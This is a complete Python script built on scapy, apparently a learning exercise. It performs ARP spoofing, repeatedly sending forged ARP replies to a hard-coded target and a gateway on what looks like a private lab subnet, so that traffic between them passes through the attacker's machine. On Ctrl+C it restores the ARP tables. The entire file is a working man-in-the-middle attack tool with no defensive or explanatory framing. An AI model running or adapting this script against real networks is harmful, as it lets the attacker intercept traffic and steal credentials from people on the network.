#! /bin/env/python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_brodcast_request=brodcast/arp_request
	answered_list = scapy.srp(arp_brodcast_request, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)
	
def restore(target_ip, source_ip):
	target_mac=get_mac(target_ip)
	source_mac=get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)


packet_sent_count = 0
target_ip="172.16.93.129"
gateway_ip="172.16.93.2"

try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packet_sent_count += 2
		# for python2
		print("\r[+]Packets Sent " + str(packet_sent_count)),
		sys.stdout.flush()
		#for python3. No sys module required
		#print("\r[+] Packets Sent: " + str(packet_sent_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] Keyboard Interupt CTRL+C detected ........restoring ARP table.")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
	print("[-] ARP Spoofer Quitted.")
	
